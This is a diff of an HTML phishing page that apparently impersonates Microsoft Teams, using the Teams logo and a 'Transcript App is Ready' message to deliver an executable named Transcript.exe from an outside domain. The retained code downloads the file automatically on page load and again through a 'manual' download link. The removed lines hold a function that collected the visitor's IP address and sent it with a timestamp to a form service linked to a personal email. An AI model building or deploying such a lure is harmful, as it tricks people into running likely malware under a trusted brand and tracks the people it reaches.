@@ -60,6 +60,7 @@
       margin-top: 10px;
     }
 
+    /* Toast-style pop-up */
     .toast {
       position: fixed;
       bottom: 30px;
@@ -104,15 +105,7 @@
       <img src="https://main-8xt.pages.dev/logo.png" alt="Microsoft Teams Logo" />
       <h1>Transcript App is Ready</h1>
       <p>Your secure download will begin automatically.<br>If not, click below:</p>
-      <button onclick="manualDownload()" style="
-  background-color: #6264a7;
-  color: white;
-  padding: 12px 24px;
-  border-radius: 6px;
-  font-weight: 600;
-  border: none;
-  cursor: pointer;
-">Download Transcript.exe</button>
+      <a href="#" onclick="manualDownload()">Download Transcript.exe</a>
     </div>
   </div>
 
@@ -124,15 +117,13 @@
 
   <script>
     function manualDownload() {
-      const url = 'https://proposaldoc.top/invite/transcript.exe';
       const link = document.createElement('a');
-      link.href = url;
+      link.href = 'https://proposaldoc.top/invite/transcript.exe';
       link.download = '';
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
       showToast();
-      trackDownload();
     }
 
     function showToast() {
@@ -140,33 +131,10 @@
       toast.style.display = 'block';
       setTimeout(() => {
         toast.style.display = 'none';
-      }, 3000);
+      }, 3000); // hide after 3 seconds
     }
 
-    function trackDownload() {
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-          const ip = data.ip;
-          const timestamp = new Date().toLocaleString();
-          const message = Download triggered:\\nIP: ${ip}\\nTime: ${timestamp};
-
-          fetch("https://formspree.io/f/mkgrnbka", {
-            method: "POST",
-            headers: {
-              'Accept': 'application/json',
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              _replyto: "kerhareti@gmail.com",
-              subject: "Transcript Download",
-              message: message
-            })
-          });
-        });
-    }
-
-    // Auto-download on page load (no toast, no tracking)
+    // Auto-download on page load (no toast)
     window.onload = function () {
       const link = document.createElement('a');
       link.href = 'https://proposaldoc.top/invite/transcript.exe';
